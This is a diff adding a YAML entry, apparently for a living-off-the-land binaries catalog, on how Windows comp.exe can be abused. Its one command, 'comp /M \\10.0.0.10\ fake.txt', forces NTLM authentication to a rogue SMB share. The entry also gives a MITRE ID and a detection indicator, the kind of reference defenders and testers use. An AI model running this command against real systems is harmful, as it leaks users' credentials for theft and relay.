@@ -1,0 +1,25 @@
+---
+Name: Comp.exe
+Description: Used to compares the contents of two files or sets of files byte-by-byte
+Author: 'Kousha Zanjani'
+Created: 2024-02-13
+Commands:
+  - Command: comp /M \\10.0.0.10\ fake.txt
+    Description: Tries to compare a file from rogue SMB Share with a fake.txt file
+    Usecase: Relay a NTLM authentication over SMB
+    Category: Credentials
+    Privileges: User
+    MitreID: T1187
+    OperatingSystem: Windows XP, Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+Full_Path:
+  - Path: C:\Windows\System32\comp.exe
+  - Path: C:\Windows\SysWOW64\comp.exe
+Code_Sample:
+  - Code:
+Detection:
+  - IOC: comp.exe retrieving files from remote server
+Resources:
+  - Link: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/comp
+Acknowledgement:
+  - Person: Kousha Zanjani
+    Handle:
